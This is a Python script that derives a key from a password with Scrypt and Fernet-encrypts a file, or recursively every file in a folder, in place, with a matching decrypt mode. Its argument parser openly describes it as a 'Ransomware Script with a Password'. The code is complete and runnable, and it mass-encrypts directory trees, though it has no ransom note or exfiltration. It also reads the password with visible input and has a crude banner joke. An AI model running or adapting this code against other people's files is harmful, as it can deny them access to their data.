import pathlib
import secrets
import os
import base64
import getpass
from colorama import Fore, Style 
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

def generate_salt(size=16):
    """Generate the salt used for key derivation,
    'size' is the length of the salt to generate"""
    return secrets.token_bytes(size)

def derive_key(salt, password):
    """Derive the key from the 'password' using the passed 'salt' """
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())    

def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()

# Core Function to generate 'key' from a password
def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Generates a key from a 'password'  and the salt
    If 'load_existing_salt' is True, it'll load the salt from a file
    in the current directory called "salt.salt".
    If 'save_salt' is True, then it'll generate a new salt and save it to "salt.salt" """
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # generate the key from the salt and the password 
    derived_key = derive_key(salt, password)
    # encode it using "Base 64" and return it
    return base64.urlsafe_b64encode(derived_key)

# FILE ENCRYPTION
def encrypt(filename, key):
    """Given a filename (str) and key (bytes), it encrypts the file and write it"""
    print(f"[*] Encrypting {filename}")
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

# FILE DECRYPTION
def decrypt(filename, key):
    """Given a filename (str) and key (bytes), it decrypts the file and write it"""
    print(f"[*] Decrypting {filename}")
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return
    # write the original file
    with open(filename,"wb") as file:
        file.write(decrypted_data)

# Folders 
        
def encrypt_folder(foldername, key):
    # if it's a folder, encrypt the entire folder (i.e all the containing files)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            # encrypt the file
            encrypt(child, key)
        elif child.is_dir():
            # if it's (sub)folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)

"""def encrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        try:
            if child.is_file():
                print(f"[*] Encrypting {child}")
                encrypt(child, key)
            elif child.is_dir():
                encrypt_folder(child, key)
        except PermissionError:
            print(f"[!] Permission denied for {child}. Skipping...")"""

def decrypt_folder(foldername, key):
    # if it's a folder, decrypt the entire folder
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            # decrypt the file
            decrypt(child, key)
        elif child.is_dir():
            # if it's a folder, decrypt the entire folder by calling this function recursively
            decrypt_folder(child, key)

# display-banner
def display_banner():
    print(f"{Fore.GREEN}File Encryptor by https://github.com/SumVir {Style.RESET_ALL}")
    print(f"{Fore.WHITE}S{Style.RESET_ALL}{Fore.RED}A{Style.RESET_ALL}{Fore.WHITE}I{Style.RESET_ALL}{Fore.RED}D{Style.RESET_ALL}")
    print("Encrypt and decrypt files/folders securely.")

    print(f"{Fore.GREEN}                  /|  /|  --------------------------- {Style.RESET_ALL}")
    print(f"{Fore.GREEN}                  ||__||  |   I have a horny little |{Style.RESET_ALL}")  
    print(f"{Fore.GREEN}                 /   O O\__     operating system    |{Style.RESET_ALL}")  
    print(f"{Fore.GREEN}                /          \                        |{Style.RESET_ALL}")  
    print(f"{Fore.GREEN}               /      \     \  www.saidsecurity.com |{Style.RESET_ALL}")
    print(f"{Fore.GREEN}              /   _    \     \ ----------------------{Style.RESET_ALL}")
    print(f"{Fore.GREEN}             /    |\____\     \      ||{Style.RESET_ALL}")
    print(f"{Fore.GREEN}            /     | | | |\____/      ||{Style.RESET_ALL}")
    print("")
    print("Don't lose salt.salt file, it's important for decrypting.")
    print(f"{Fore.RED}USAGE: -h shows help  -e to encrypt   -d to decrypt, -s salt size.")
    print("")
    print()

# Argparse
if __name__ == "__main__":
    display_banner()
    import argparse
    parser = argparse.ArgumentParser(description="Ransomware Script with a Password by SumVir on Github")
    parser.add_argument("path", help="Path to encrypt/decrypt, can be a file or an entire folder")
    parser.add_argument("-s", "--salt-size", help="If this is set, a new salt with the passed size is generated",type=int)
    parser.add_argument("-e", "--encrypt", action="store_true",
                        help="Whether to encrypt the file/folder, only -e or -d can be specified." )
    parser.add_argument("-d", "--decrypt", action="store_true",
                        help="Whether to decrypt the file/folder, only -e or -d can be specified." )
    
    # parse the arguments
    args = parser.parse_args()
    
    # get the password
    if args.encrypt:
        password = input("Enter the password for encryption: ")
    
    elif args.decrypt:
        password = input("Enter the same password you used for encryption: ")
    
    # generate the key
    if args.salt_size:
        key = generate_key(password, salt_size=args.salt_size, save_salt=True)
    else:
        key = generate_key(password, load_existing_salt=True)
    
    
    # get the encrypt and decrypt flags
    encrypt_ = args.encrypt
    decrypt_ = args.decrypt
    
    # check if both encrypt and decrypt are specified
    if encrypt_ and decrypt_:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it. ")
    
    elif encrypt_:
        if os.path.isfile(args.path):
            # if it's a file, encrypt it
            encrypt(args.path, key)
        elif os.path.isdir(args.path):
            encrypt_folder(args.path, key)
    
    elif decrypt_:
        if os.path.isfile(args.path):
            decrypt(args.path, key)
        elif os.path.isdir(args.path):
            decrypt_folder(args.path, key)
    else:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it. ")


